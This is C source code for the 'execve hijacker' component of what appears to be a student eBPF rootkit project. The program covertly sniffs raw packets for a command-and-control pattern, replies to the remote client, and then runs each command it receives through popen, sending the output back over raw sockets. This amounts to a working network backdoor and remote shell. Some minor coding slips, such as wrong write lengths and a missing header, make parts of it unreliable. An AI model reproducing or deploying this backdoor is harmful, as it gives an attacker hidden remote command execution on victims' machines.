#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <sys/wait.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "lib/RawTCP.h"
#include "../common/c&c.h"


char* execute_command(char* command){
    FILE *fp;
    char* res = calloc(4096, sizeof(char));
    char buf[1024];

    fp = popen(command, "r");
    if(fp == NULL) {
        printf("Failed to run command\n" );
        return "COMMAND ERROR";
    }

    while(fgets(buf, sizeof(buf), fp) != NULL) {
        strcat(res, buf);
    }
    printf("RESULT OF COMMAND: %s\n", res);

    pclose(fp);
    return res;
}


char* getLocalIpAddress(){
    char hostbuffer[256];
    char* IPbuffer = calloc(256, sizeof(char));
    struct hostent *host_entry;
    int hostname;
  
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
    if(hostname==-1){
        exit(1);
    }
  
    host_entry = gethostbyname(hostbuffer);
    if(host_entry == NULL){
        exit(1);
    }
  
    // To convert an Internet network
    // address into ASCII string
    strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
  
    return IPbuffer;
}

int main(int argc, char* argv[]){
    printf("Hello world from execve hijacker\n");

    time_t rawtime;
    struct tm * timeinfo;

    time ( &rawtime );
    timeinfo = localtime ( &rawtime );
    char* timestr = asctime(timeinfo);

    for(int ii=0; ii<argc; ii++){
        printf("Argument %i is %s\n", ii, argv[ii]);
    }

    //We proceed to fork() and exec the original program, whilst also executing the one we 
    //ordered to execute via the network backdoor
    //int bpf_map_fd = bpf_map_get_fd_by_id()

    int fd = open("/home/osboxes/TFG/src/log", O_RDWR | O_CREAT | O_TRUNC, 0666);
    
    int ii = 0;
    while(*(timestr+ii)!='\0'){
        write(fd, timestr+ii, 1);
        ii++;
    }
    write(fd, "\t", 1);
    
    ii = 0;
    while(*(argv[0]+ii)!='\0'){
        write(fd, argv[0]+ii, 1);
        ii++;
    }

    write(fd, "\n", 1);

    

    write(fd, "Sniffing...\n", 13);
    packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
    if(packet.ipheader == NULL){
        write(fd, "Failed to open rawsocket\n", 1);
        return -1;
    }
    write(fd, "Sniffed\n", 9);
    //TODO GET THE IP FROM THE BACKDOOR CLIENT
    char* local_ip = getLocalIpAddress();
    char remote_ip[16];
    inet_ntop(AF_INET, &(packet.ipheader->saddr), remote_ip, 16);
    printf("IP: %s\n", local_ip);
    
    packet_t packet_ack = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_ACK);
    if(rawsocket_send(packet_ack)<0){
        write(fd, "Failed to open rawsocket\n", 1);
        close(fd);
        return -1;
    }

    //Start of pseudo connection with the rootkit client
    int connection_close = 0;
    while(!connection_close){
        packet_t packet = rawsocket_sniff_pattern(CC_PROT_MSG);
        printf("Received client message\n");
        char* payload = packet.payload;
        char *p;
        p = strtok(payload, "#");
        p = strtok(NULL, "#");
        if(p){
            if(strcmp(p, CC_PROT_FIN_PART)==0){
                printf("Connection closed by request\n");
                connection_close = 1;
            }else{
                printf("Received request: %s\n", p);
                char* res = execute_command(p);
                char* payload_buf = calloc(4096, sizeof(char));
                strcat(payload_buf, CC_PROT_MSG);
                strcat(payload_buf, res);
                packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, payload_buf);
                if(rawsocket_send(packet_res)<0){
                    write(fd, "Failed to open rawsocket\n", 1);
                    close(fd);
                    return -1;
                }
                free(payload_buf);
                free(res);
            }
        }
    }

    close(fd);
    return 0;
}